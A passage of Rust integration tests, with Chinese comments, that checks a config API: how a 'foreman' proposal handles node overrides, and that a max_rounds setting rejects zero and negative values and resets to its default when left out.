    // ② 原样带回来：照常写（这才是决策 228 要的那条路——先看清、照着带回来）。
    let pid = seed_proposal(
        &api,
        &sid,
        "config",
        json!({
            "action": "set",
            "stage": "architect-design",
            "temperature": 0.9,
            "node_overrides_json": overrides,
        }),
    )
    .await;
    let (status, body) = post(
        &api,
        &format!("/foreman/proposals/{pid}/execute"),
        json!({}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");

    // ③ 显式清空：`{}` 与「没带」分得开，故它写得进去。
    let pid = seed_proposal(
        &api,
        &sid,
        "config",
        json!({"action": "set", "stage": "architect-design", "node_overrides_json": {}}),
    )
    .await;
    let (status, body) = post(
        &api,
        &format!("/foreman/proposals/{pid}/execute"),
        json!({}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    let cleared = api
        .state
        .store
        .get_stage_config("architect-design")
        .await
        .unwrap()
        .unwrap();
    assert_eq!(cleared.node_overrides_json, Some(serde_json::json!({})));

    // ④ 本来就没有覆盖的阶段不受这条守卫影响（不是「一律要带」）。
    let pid = seed_proposal(
        &api,
        &sid,
        "config",
        json!({"action": "set", "stage": "develop", "temperature": 0.2}),
    )
    .await;
    let (status, body) = post(
        &api,
        &format!("/foreman/proposals/{pid}/execute"),
        json!({}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
}

/// 轮数上限只收正整数（决策 233① / 239）：`0` / 负数当场拒，缺省（不传）与显式清空都合法。
#[tokio::test]
async fn max_rounds_accepts_only_positive_integers() {
    let api = api().await;

    // 正面：正整数写得进去、读得回来。
    let (status, body) = put(
        &api,
        "/stage-configs/foreman",
        serde_json::json!({"max_rounds": 42}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["stage_config"]["max_rounds"], 42);
    let stored = api
        .state
        .store
        .get_stage_config("foreman")
        .await
        .unwrap()
        .unwrap();
    assert_eq!(stored.max_rounds, Some(42));

    // `0` 与负数：拒，且报文说清「没有无上限这一档」。
    for bad in [serde_json::json!(0), serde_json::json!(-1)] {
        let (status, body) = put(
            &api,
            "/stage-configs/foreman",
            serde_json::json!({"max_rounds": bad}),
        )
        .await;
        assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
        let message = body["error"].as_str().unwrap_or_default();
        assert!(message.contains("正整数"), "{message}");
        assert!(message.contains("无上限"), "要说清没有那一档：{message}");
    }
    // 被拒的两次都没改动旧值。
    let stored = api
        .state
        .store
        .get_stage_config("foreman")
        .await
        .unwrap()
        .unwrap();
    assert_eq!(stored.max_rounds, Some(42));

    // 不传 = 回到缺省（整条替换的既有语义）。
    let (status, _) = put(&api, "/stage-configs/foreman", serde_json::json!({})).await;
    assert_eq!(status, StatusCode::OK);
    let cleared = api
        .state
        .store
        .get_stage_config("foreman")
        .await
        .unwrap()
        .unwrap();
    assert_eq!(cleared.max_rounds, None, "留空即清成默认（缺省 300）");
}
